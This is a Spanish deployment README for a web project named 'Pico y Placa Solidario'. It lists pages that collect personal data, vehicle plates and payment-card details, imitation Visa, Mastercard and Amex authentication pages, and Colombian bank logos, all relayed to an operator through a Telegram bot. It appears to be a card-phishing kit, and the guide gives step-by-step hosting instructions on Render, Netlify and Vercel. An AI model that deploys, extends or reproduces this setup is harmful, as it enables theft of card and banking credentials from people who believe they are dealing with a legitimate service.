# Pico y Placa Solidario - Guía de Despliegue

## Estructura del Proyecto

```
├── index.html              # Página principal
├── datos.html              # Paso 1: Datos personales
├── placa.html              # Paso 2: Placas
├── pago.html               # Paso 3: Selección de pago
├── tarjeta.html            # Paso 4: Formulario de tarjeta
├── visa.html               # Auth Visa
├── mastercard.html         # Auth Mastercard
├── amex.html               # Auth Amex
├── config.php              # CONFIGURACIÓN CENTRALIZADA (tokens)
├── telegram_send.php       # Proxy universal Telegram
├── callback.php            # Callback botones Telegram
├── api/webhook.js          # Webhook para Vercel
├── render.yaml             # Config para Render
├── netlify.toml            # Config para Netlify
├── vercel.json             # Config para Vercel
├── data/payments/          # Persistencia de pagos
└── data/solicitudes/       # Persistencia de solicitudes
```

---

## OPCIÓN A: Render (Recomendado - Todo en uno)

Render soporta PHP nativo. Todo funciona en un solo servicio.

### Pasos:
1. Ve a https://render.com y crea una cuenta
2. Click en **"New +"** → **"Web Service"**
3. Conecta tu repositorio de GitHub o sube el ZIP
4. Configura:
   - **Name**: `pico-placa-solidario`
   - **Environment**: `PHP`
   - **Build Command**: (dejar vacío)
   - **Start Command**: `heroku-php-apache2 .`
5. En **Environment Variables** agrega:
   - `TG_BOT_TOKEN` = tu token de Telegram
   - `TG_CHAT_ID` = tu chat ID
6. Click en **"Create Web Service"**

### Configurar config.php:
Edita `config.php` con tus credenciales:
```php
define('TG_BOT_TOKEN', 'TU_TOKEN_AQUI');
define('TG_CHAT_ID', 'TU_CHAT_ID_AQUI');
```

### Configurar Webhook de Telegram:
Una vez desplegado, visita:
```
https://tu-app.onrender.com/api/webhook?setup=true
```

---

## OPCIÓN B: Netlify + Render (Frontend + Backend separados)

### Frontend en Netlify:
1. Ve a https://app.netlify.com/drop
2. Arrastra la carpeta completa
3. Netlify publica los HTML estáticos

### Backend en Render:
1. Sigue los pasos de Opción A solo con los archivos PHP
2. En los HTML del frontend, cambia:
```js
const BACKEND_PROXY = 'https://tu-api.onrender.com/telegram_send.php';
const BACKEND_CALLBACK = 'https://tu-api.onrender.com/callback.php';
```

---

## OPCIÓN C: Vercel (Node.js)

1. Instala Vercel CLI: `npm i -g vercel`
2. En la carpeta del proyecto ejecuta: `vercel`
3. Configura las variables de entorno en el dashboard de Vercel
4. El webhook está en `api/webhook.js`

---

## Archivos de Imagen Requeridos

Asegúrate de que estas imágenes existan en la raíz:
- `visa.png`, `mastercard.png`, `amex.png`, `ame.png`, `master.png`
- `image.png`, `blur.png`
- Logos de bancos: `bancol.png`, `davivienda.png`, `db.png`, `popu.png`, `fala.png`, `itau.png`, `Caja.jpg`, `bog.png`, `occi.png`

---

## Solución de Problemas

### Error CORS:
Los HTML ya no llaman directamente a Telegram. Todo pasa por el backend PHP.

### Tokens expuestos:
Los tokens SOLO viven en `config.php` (server-side). Nunca en el JS del cliente.

### Estado perdido:
Los datos se guardan en `data/payments/` y `data/solicitudes/` con bloqueo de archivos (LOCK_EX).

### Rate limit de Telegram:
Implementado backoff exponencial con 3 reintentos automáticos.
